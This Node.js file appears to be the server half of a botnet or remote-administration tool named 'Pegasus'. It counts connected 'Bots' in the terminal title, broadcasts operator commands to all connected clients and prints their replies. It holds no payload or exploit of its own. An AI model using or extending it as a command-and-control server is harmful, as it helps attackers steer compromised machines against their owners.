import net from "net";
import prompt from "./commands.js";
import dotenv from "dotenv";

dotenv.config({ path: "../config/.env" });

let clientCount = 0;
let clients, clientInstances, silent;

const clientModules = {
	clients: (clients = []),
	clientInstances: clientInstances,
	silent: (silent = false),
};

const PORT = process.env.PORT;
const HOST = process.env.HOST;

function setTerminalTitle() {
	process.stdout.write(
		String.fromCharCode(27) +
			"]0;" +
			`Pegasus | Bots: ${clientCount}` +
			String.fromCharCode(7)
	);
}
setTerminalTitle();

function broadcast(message) {
	clientModules.clientInstances.forEach((client) => {
		client.write(message);
	});
	process.stdout.write("\n" + message);
}

net
	.createServer((socket) => {
		// Identify client
		socket.name = `${socket.remoteAddress}:${socket.remotePort}`;

		// On client connect
		clientModules.clients.push(socket);
		clientCount++;

		clientModules.clientInstances = [...clientModules.clients];
		setTerminalTitle();

		console.log(`\x1b[91m\nClient ${socket.name} has connected.\n\x1b[0m`);

		prompt();

		socket.on("data", (data) => {
			if (!clientModules.silent)
				broadcast(`\x1b[33m[CLIENT ${socket.name}]\x1b[0m ` + data, socket);
			prompt();
		});

		socket.on("error" || "end", () => {
			clientDisconnected();
		});

		function clientDisconnected() {
			clientModules.clients.splice(clientModules.clients.indexOf(socket), 1);
			clientCount--;
			clientModules.clientInstances = [...clientModules.clients];
			console.log(`\x1b[91m\nClient ${socket.name} has disconnected.\n\x1b[0m`);
			if (clientCount < 1) console.log("\x1b[91mWaiting for clients to connect.\x1b[0m");
			setTerminalTitle();
		}
	})
	.listen(PORT, HOST);

console.log(`\x1b[31m
 ██▓███  ▓█████   ▄████  ▄▄▄        ██████  █    ██   ██████ 
▓██░  ██▒▓█   ▀  ██▒ ▀█▒▒████▄    ▒██    ▒  ██  ▓██▒▒██    ▒ 
▓██░ ██▓▒▒███   ▒██░▄▄▄░▒██  ▀█▄  ░ ▓██▄   ▓██  ▒██░░ ▓██▄   
▒██▄█▓▒ ▒▒▓█  ▄ ░▓█  ██▓░██▄▄▄▄██   ▒   ██▒▓▓█  ░██░  ▒   ██▒
▒██▒ ░  ░░▒████▒░▒▓███▀▒ ▓█   ▓██▒▒██████▒▒▒▒█████▓ ▒██████▒▒
▒▓▒░ ░  ░░░ ▒░ ░ ░▒   ▒  ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
░▒ ░      ░ ░  ░  ░   ░   ▒   ▒▒ ░░ ░▒  ░ ░░░▒░ ░ ░ ░ ░▒  ░ ░
░░          ░   ░ ░   ░   ░   ▒   ░  ░  ░   ░░░ ░ ░ ░  ░  ░  
            ░  ░      ░       ░  ░      ░     ░           ░  
                                                             
\x1b[0m`);

// console.log(`\x1b[36m
// __________
// \\______   \\ ____   _________    ________ __  ______
//  |     ___// __ \\ / ___\\__  \\  /  ___/  |  \\/  ___/
//  |    |   \\  ___// /_/  > __ \\_\\___ \\|  |  /\\___ \\
//  |____|    \\___  >___  (____  /____  >____//_____ >
//                \\/_____/     \\/     \\/           \\/
// \x1b[0m`);
console.log(`\x1b[91m
Server running on ${HOST}:${PORT}.
\x1b[0m`);
console.log(`\x1b[91m
Waiting for connections.
\x1b[0m`);

export { clientModules, broadcast };
